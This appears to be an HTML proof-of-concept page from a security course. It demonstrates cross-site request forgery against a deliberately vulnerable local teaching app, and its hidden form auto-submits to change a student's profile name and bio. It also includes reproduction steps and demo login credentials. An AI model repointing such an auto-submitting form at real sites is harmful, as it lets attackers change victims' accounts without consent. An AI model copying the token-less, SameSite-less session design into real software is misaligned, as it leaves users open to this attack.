<!--
  LOCAL, APP-ONLY CSRF proof-of-concept for THIS app only.
  Target: [VULN: No CSRF protection — Task 3] on POST /api/profile
          (src/app/api/profile/route.ts), enabled by the session cookie having
          no SameSite attribute (src/lib/session.ts).

  This page is hard-pointed at http://127.0.0.1:3000 and does nothing to any
  other site. It is not a reusable tool.

  HOW TO REPRODUCE (localhost only):
    1. npm run dev, then log in to the app in your browser as a student
       (e.g. ada.learner@campus.local / ada-pw-2025).
    2. In the SAME browser, open this file (double-click, or a file:// URL).
    3. It auto-submits a cross-origin form to /api/profile using your ambient
       session cookie. With no CSRF token and no SameSite, the request is
       accepted and your display name is silently overwritten.
    4. Reload /dashboard to see the change — proof the state change happened
       without your consent and without a CSRF token.

  Reset afterwards: set your display name back on /profile, or `npm run db:reset`.
-->
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>CSRF PoC (IFT542, localhost only)</title>
  </head>
  <body>
    <h1>CSRF proof-of-concept (localhost teaching demo)</h1>
    <p>
      If you are logged into the app at <code>http://127.0.0.1:3000</code>, this page will submit a
      profile change on your behalf with no CSRF token.
    </p>

    <form id="csrf" action="http://127.0.0.1:3000/api/profile" method="POST">
      <input type="hidden" name="display_name" value="CSRF&#39;d by another site" />
      <input type="hidden" name="bio" value="This bio was changed cross-site without a token." />
    </form>

    <script>
      // Auto-submit to demonstrate the missing CSRF protection.
      document.getElementById("csrf").submit();
    </script>
  </body>
</html>
